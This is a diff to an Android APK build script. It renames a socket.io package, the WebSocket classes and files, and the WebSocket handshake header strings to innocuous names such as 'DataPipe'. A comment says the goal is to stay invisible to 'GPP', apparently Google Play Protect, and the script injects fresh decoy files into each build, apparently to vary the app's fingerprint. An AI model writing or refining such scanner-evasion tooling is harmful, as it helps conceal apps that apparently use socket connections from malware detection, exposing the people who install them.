@@ -1879,6 +1879,30 @@ def step_6e_rename_socket_package(new_pkg: str) -> int:
     _py_sed(smali_dir, old_pkg_path, new_pkg_path)
     _py_sed(smali_dir, old_pkg_dot,  new_pkg_dot)
 
+    # 2a. Rename WebSocket class name → DataPipe
+    #     Covers type descriptors: Lcom/netlib/.../WebSocket; → Lcom/netlib/.../DataPipe;
+    #     AND smali file content references — class name still visible to GPP after pkg rename
+    _py_sed(smali_dir, "/WebSocket;",          "/DataPipe;")
+    _py_sed(smali_dir, "/WebSocket$",          "/DataPipe$")
+    _py_sed(smali_dir, "WebSocket.smali",      "DataPipe.smali")
+    _py_sed(smali_dir, "priorWebsocketSuccess","priorDataPipeSuccess")
+    _py_sed(smali_dir, "Sec-WebSocket-Accept", "Sec-Protocol-Accept")
+    _py_sed(smali_dir, "Sec-WebSocket-Key",    "Sec-Protocol-Key")
+    _py_sed(smali_dir, "websocket",            "datastream")
+    _py_sed(smali_dir, "WebSocket",            "DataPipe")
+    print("  ✅ WebSocket class name → DataPipe (type descriptors + refs)")
+
+    # 2b. Rename WebSocket smali FILES on disk (not just content)
+    for _root, _dirs, _files in os.walk(smali_dir):
+        for _fname in _files:
+            if "WebSocket" in _fname:
+                _old = os.path.join(_root, _fname)
+                _new = os.path.join(_root, _fname.replace("WebSocket", "DataPipe"))
+                try:
+                    os.rename(_old, _new)
+                except Exception:
+                    pass
+
     # 2. Move the smali directory tree: smali/io/socket/* → smali/com/netlib/*
     old_dir = os.path.join(smali_dir, "io", "socket")
     new_dir = os.path.join(smali_dir, "com", "netlib")
@@ -3400,8 +3424,16 @@ def step_decoy_noise_files(build_hash: str) -> None:
 
     with zipfile.ZipFile(apk_path, "r") as zin, \
          zipfile.ZipFile(tmp, "w", compression=zipfile.ZIP_DEFLATED) as zout:
+        # Copy existing entries — skip any that we are about to inject fresh
+        # This prevents duplicate ZIP entries when companion was already processed
+        existing_names = set(zin.namelist())
+        decoy_names    = set(all_decoys.keys())
         for item in zin.infolist():
+            if item.filename in decoy_names:
+                # Skip old decoy — will be replaced with fresh data below
+                continue
             zout.writestr(item, zin.read(item.filename))
+        # Inject fresh decoy files (always new content per build)
         for fname, data in all_decoys.items():
             zout.writestr(fname, data)
             print(f"  + {fname} ({len(data)} bytes)")
